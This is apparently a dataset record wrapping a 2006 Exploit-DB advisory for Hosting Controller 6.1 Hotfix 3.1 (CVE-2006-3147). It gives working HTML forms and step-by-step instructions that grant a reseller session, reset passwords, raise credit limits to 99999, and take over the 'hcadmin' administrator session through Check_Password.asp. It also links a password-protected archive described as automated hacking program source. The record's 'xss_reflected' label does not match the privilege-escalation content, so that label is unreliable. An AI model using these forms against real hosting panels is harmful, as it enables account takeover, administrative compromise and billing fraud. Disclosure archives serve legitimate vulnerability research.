{
  "id": "1987",
  "title": "Hosting Controller 6.1 Hotfix 3.1 - Privilege Escalation",
  "cve": "CVE-2006-3147",
  "vuln_type": "xss_reflected",
  "code": "Title: An attacker can gain reseller privileges and after that can gain admin privileges\r\nVersion: 6.1 Hotfix <= 3.1\r\nDeveloper url: www.Hostingcontroller.com\r\nSolution: Update to Hotfix 3.2\r\nDiscover date: 2005,Summer\r\nReport date (to hc company): Sat Jun 10, 2006\r\nPublish date (in security forums): Thu July 06, 2006\r\n\r\n-------------------------------------------------------------------------------------\r\n===============================================\r\n1- This code give resadmin session to a user:\r\nBug in \"hosting/addreseller.asp\", No checker is available.\r\n---------------------------------------------------\r\n\r\n<script>\r\nfunction siteaction(){\r\nn_act= \"/hosting/addreseller.asp?htype=3\"\r\nwindow.document.all.frm1.action = window.document.all.siteact.value + n_act\r\nwindow.document.all.frm1.submit()\r\n}\r\n</script>\r\n<hr><br>\r\nForm1<br>\r\nURL: <input type=\"text\" name=siteact size=70>\r\n<br>\r\n<form name=\"frm1\" method=\"post\" onsubmit=\"return siteaction()\">\r\n<table>\r\n<tr>\r\n<td>reseller</td>\r\n<td><input type=\"text\" name=\"reseller\" value=\"hcadmin\"></td>\r\n</tr>\r\n<tr>\r\n<td>loginname</td>\r\n<td><input type=\"text\" name=\"loginname\" value=\"hcadmin\"></td>\r\n</tr>\r\n<tr>\r\n<td>Password</td>\r\n<td><input type=\"text\" name=\"Password\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>first_name</td>\r\n<td><input type=\"text\" name=\"first_name\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>first_name</td>\r\n<td><input type=\"text\" name=\"first_name\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>last_name</td>\r\n<td><input type=\"text\" name=\"last_name\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>address</td>\r\n<td><input type=\"text\" name=\"address\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>city</td>\r\n<td><input type=\"text\" name=\"city\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>state</td>\r\n<td><input type=\"text\" name=\"state\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>country</td>\r\n<td><input type=\"text\" name=\"country\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>email</td>\r\n<td><input type=\"text\" name=\"email\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>phone</td>\r\n<td><input type=\"text\" name=\"phone\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>fax</td>\r\n<td><input type=\"text\" name=\"fax\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>zip</td>\r\n<td><input type=\"text\" name=\"zip\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>selMonth</td>\r\n<td><input type=\"text\" name=\"selMonth\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>selYear</td>\r\n<td><input type=\"text\" name=\"selYear\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>txtcardno</td>\r\n<td><input type=\"text\" name=\"txtcardno\" value=\"\"></td>\r\n</tr>\r\n</table>\r\n<br><input type=\"submit\">\r\n</form>\r\n---------------------------------------------------\r\n===============================================\r\n2- This code list all of resellers then you must change a password of one of them then login by it for next step.\r\nNote: Also by this code, everyone can increase its Credit value then buy every host.\r\n---------------------------------------------------\r\n<form action=\"http://[URL]/Admin/Accounts/AccountActions.asp?ActionType=UpdateCreditLimit\" method=\"post\">\r\n<table>\r\n<tr>\r\n<td>Username:</td>\r\n<td><input type=\"text\" name=\"UserName\" value=\"hcadmin\"></td>\r\n</tr>\r\n<tr>\r\n<td>Description:</td>\r\n<td><input type=\"text\" name=\"Description\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>FullName:</td>\r\n<td><input type=\"text\" name=\"FullName\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>AccountDisabled 1,[blank]:</td>\r\n<td><input type=\"text\" name=\"AccountDisabled\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>UserChangePassword:</td>\r\n<td><input type=\"text\" name=\"UserChangePassword\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>PassCheck=TRUE,0:</td>\r\n<td><input type=\"text\" name=\"PassCheck\" value=\"0\"></td>\r\n</tr>\r\n<tr>\r\n<td>New Password:</td>\r\n<td><input type=\"text\" name=\"Pass1\" value=\"\"></td>\r\n</tr>\r\n<tr>\r\n<td>DefaultDiscount%:</td>\r\n<td><input type=\"text\" name=\"DefaultDiscount\" value=\"100\"></td>\r\n</tr>\r\n<tr>\r\n<td>CreditLimit:</td>\r\n<td><input type=\"text\" name=\"CreditLimit\" value=\"99999\"></td>\r\n</tr>\r\n</table>\r\n<br><input type=\"submit\">\r\n</form>\r\n<hr><br>\r\n---------------------------------------------------\r\n===============================================\r\n3- Now you must login by a resseler that changed password from last step. now goto userlist, if there is a user that will enough and if no user available, u must make it!\r\nnow select it and click Enter to enter by that user. now the bug will be available:\r\neach reseller can gain every user session even \"HCADMIN\" by bug in \"Check_Password.asp\"\r\nbelow code will help you:\r\n---------------------------------------------------\r\n<hr><br>\r\nForm1<br>\r\n<form action=\"http://[URL]/Admin/Check_Password.asp\" method=\"post\">\r\n<table>\r\n<tr>\r\n<td>AdName</td>\r\n<td><input type=\"text\" name=\"AdName\" value=\"hcadmin\"></td>\r\n</tr>\r\n</table>\r\n<br><input type=\"submit\">\r\n</form>\r\n<hr><br>\r\n---------------------------------------------------\r\n===============================================\r\n\r\n-------------------------------------------------------------------------------------\r\n\r\nFinder: Soroush Dalili (http://www.google.com/search?hl=en&q=\"soroush+dalili\")\r\nEmail: Irsdl[47]Yahoo[d07]com\r\nTeam: GSG (Grayhatz Security Group) [Grayhatz.net]\r\nThanks from: \r\n\tFarhad Saaedi (farhadjokers[4t]yahoo[d0t]com)\r\n\tSmall.Mouse from Shabgard.org  (small.mouse[4t]yahoo[d0t]com)\r\n\tKahkeshan Co. (IT Department) (www.kahkeshan.com)\r\nRelated URLs:\r\n\thttp://hidesys.persiangig.com/other/HC_BUGS_BEFORE3.2.txt (all hc bugs by Irsdl)\r\n\thttp://hidesys.persiangig.com/other/HC%20Hack%20Prog.rar [password: grayhatz.net] (HC automation hacking program source code by simple VB)\r\n\r\n# milw0rm.com [2006-07-06]",
  "url": "https://www.exploit-db.com/exploits/1987"
}